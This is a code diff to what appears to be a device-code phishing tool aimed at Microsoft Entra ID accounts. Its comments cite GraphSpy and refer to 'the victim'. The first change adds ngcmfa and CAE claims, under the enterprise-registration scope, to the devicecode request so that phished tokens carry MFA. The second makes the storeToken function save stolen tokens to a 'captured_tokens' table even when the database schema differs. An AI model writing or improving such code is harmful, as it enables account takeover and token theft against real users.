@@ -53,9 +53,31 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
     const deviceCodeScope =
       'openid profile email offline_access urn:ms-drs:enterpriseregistration.windows.net/.default';
     const deviceCodeUrl = `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`;
+
+    // GraphSpy device_codes.generate(version=2, ngcmfa=True, cae=True):
+    //
+    //   body = {"client_id": client_id, "scope": scope}
+    //   if ngcmfa or cae:
+    //       claims_json = {"access_token": {}}
+    //       if ngcmfa: claims_json["access_token"]["amr"]    = {"values": ["ngcmfa"]}
+    //       if cae:    claims_json["access_token"]["xms_cc"] = {"values": ["cp1"]}
+    //       body["claims"] = json.dumps(claims_json)
+    //
+    // This was the reason the victim was never prompted for MFA: the claims
+    // block was absent from the request that actually issues the code, so AAD
+    // was free to satisfy the sign-in from an existing session. amr=ngcmfa
+    // forces a strong-auth (MFA) step; xms_cc=cp1 opts into Continuous Access
+    // Evaluation. Both must ride on the devicecode call itself.
+    const deviceCodeClaims = {
+      access_token: {
+        amr: { values: ['ngcmfa'] },
+        xms_cc: { values: ['cp1'] },
+      },
+    };
     const deviceCodeBody = new URLSearchParams({
       client_id: clientId,
       scope: deviceCodeScope,
+      claims: JSON.stringify(deviceCodeClaims),
     });
     const requestHeaders = {
       'Content-Type': 'application/x-www-form-urlencoded'
@@ -757,7 +779,12 @@ async function storeToken(job, tokenData, responseCookies = []) {
         tokenId = result.insertId;
       } catch (primaryInsertErr) {
         const primaryMsg = primaryInsertErr?.message || '';
+        // Any "Unknown column 'x' in 'field list'" means this deployment's
+        // captured_tokens is missing a column the primary INSERT needs. Treat
+        // every such case as a schema issue so the legacy (narrower) INSERT
+        // still records the capture instead of the whole row being lost.
         const isDeviceSchemaIssue =
+          /Unknown column/i.test(primaryMsg) ||
           /Unknown column 'device_id'/.test(primaryMsg) ||
           /Unknown column 'device_certificate_encrypted'/.test(primaryMsg) ||
           /Unknown column 'encrypted_private_key'/.test(primaryMsg) ||
